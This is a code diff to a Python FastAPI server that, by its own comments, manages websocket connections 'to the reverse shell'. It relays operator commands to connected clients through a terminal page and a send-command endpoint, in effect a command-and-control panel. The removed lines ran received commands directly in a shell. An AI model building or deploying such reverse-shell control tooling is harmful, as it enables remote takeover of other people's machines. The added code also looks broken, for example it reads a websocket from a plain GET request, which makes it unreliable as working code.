@@ -118,26 +118,19 @@ async def download_file(filename: str):
 # open a websocket connection to the reverse shell
 @app.websocket("/ws/{client_id}")
 async def websocket_endpoint(websocket: WebSocket, client_id: int):
-    print("waiting for connection")
-    await manager.connect(websocket)
-    if manager.is_connected(websocket):
-        print(f"Client {client_id} connected")
+    await manager.connect(websocket, client_id)
+    try:
         while True:
-            command = await manager.receive_shell_command(websocket)
-            print(f"Client {client_id} sent command: {command}")
-            process = await aiosubprocess.create_subprocess_shell(command, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
-            stdout, stderr = await process.communicate()
-            await manager.send_shell_output(websocket, stdout.decode())
-            print(f"Client {client_id} sent output: {stdout.decode()}")
-    else:
-        print(f"Client {client_id} disconnected")
-        await manager.disconnect(websocket)
+            data = await websocket.receive_text()
+            await manager.send_shell_input(data, websocket, client_id)
+    except WebSocketDisconnect:
+        manager.disconnect(websocket, client_id)
 
-# render the terminal in an HTML template
-@app.get("/terminal")
-def terminal(request: Request):
-    # Replace `websocket` and `message` with the appropriate values
-    return templates.TemplateResponse("terminal.html", {"request": request, "output": manager.send_shell_output(websocket, message)})
+@app.get("/terminal/{client_id}")
+def terminal(request: Request, client_id: int):
+    # Replace `client_id` with the appropriate value
+    websocket = request.websocket
+    return templates.TemplateResponse("terminal.html", {"request": request, "output": manager.send_shell_output(websocket, client_id)})
 
 # send the command to the reverse shell
 @app.post("/send-command")
